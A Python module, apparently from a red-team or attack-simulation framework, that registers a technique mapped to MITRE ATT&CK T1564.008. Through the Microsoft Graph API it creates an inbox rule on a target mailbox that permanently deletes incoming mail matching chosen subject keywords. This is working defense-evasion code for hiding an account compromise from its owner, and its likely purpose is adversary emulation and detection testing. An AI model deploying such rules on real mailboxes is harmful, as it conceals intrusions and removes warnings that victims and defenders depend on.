from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from core.entra.graph_request import GraphRequest

@TechniqueRegistry.register
class M365DeployEmailDelRule(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1564.008",
                technique_name="Hide Artifacts",
                tactics=["Defense Evasion"],
                sub_technique_name="Email Hiding Rules"
            )
        ]
        super().__init__("Deploy Email Deletion Rule", "Sets up email deletion rule on target user mailbox", mitre_techniques)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)

        try:
            mailbox: str = kwargs.get('mailbox', None)
            rule_name: str = kwargs.get('rule_name', None)
            keywords: str = kwargs.get('keywords', None)

            if mailbox in [None, ""] or  rule_name in [None, ""] or  keywords in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": {"Error" : "Invalid Technique Input"},
                    "message": {"Error" : "Invalid Technique Input"}
                }

            # break input string into a list for graph input
            keywords = keywords.split(",")
            # remove any leading or trailing spaces from input
            for i,words in enumerate(keywords):
                keywords[i] = words.strip()

            endpoint_url = f"https://graph.microsoft.com/v1.0/users/{mailbox}/mailFolders/inbox/messageRules"
            
            # Create request payload
            data = {
                "displayName": rule_name,
                "sequence": 1,
                "isEnabled": "true", 
                "conditions": {
                    "sentToMe": "true",
                    "subjectContains": keywords
                },
                "actions": {
                    "permanentDelete": 'true',
                    "stopProcessingRules": 'true'
                }
            }
            
            raw_response = GraphRequest().post(url = endpoint_url, data = data)

            # Delete rule setup successful
            if 200 <= raw_response.status_code < 300:
                return ExecutionStatus.SUCCESS, {
                    "message": f"Successfully deployed email deletion rule on mailbox",
                    "value": {
                        'rule_name' : rule_name,
                        'rule_id' : raw_response.json().get('id', 'N/A'),
                        'rule_enabled' : raw_response.json().get('isEnabled', 'N/A'),
                        'conditions' : raw_response.json().get('conditions', 'N/A'),
                        'actions' : raw_response.json().get('actions', 'N/A'),
                        'sequence' : raw_response.json().get('sequence', 'N/A'),
                    }
                }
            else:
                return ExecutionStatus.FAILURE, {
                    "error": {
                        "error_code": raw_response.json().get('error').get('code', 'N/A'),
                        "eror_message": raw_response.json().get('error').get('message', 'N/A')
                    },
                    "message": "Failed to deploy email deletion rule on mailbox"
                }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to deploy email deletion rule on mailbox"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "mailbox": {
                "type": "str", 
                "required": True, 
                "default":None, 
                "name": "Target Mailbox", 
                "input_field_type" : "email"
            },
            "rule_name": {
                "type": "str", 
                "required": True, 
                "default":None, 
                "name": "Rule Name", 
                "input_field_type" : "text"
            },
            "keywords": {
                "type": "str", 
                "required": True, 
                "default":None, 
                "name": "Delete Rule Keywords", 
                "input_field_type" : "text"
            }
        }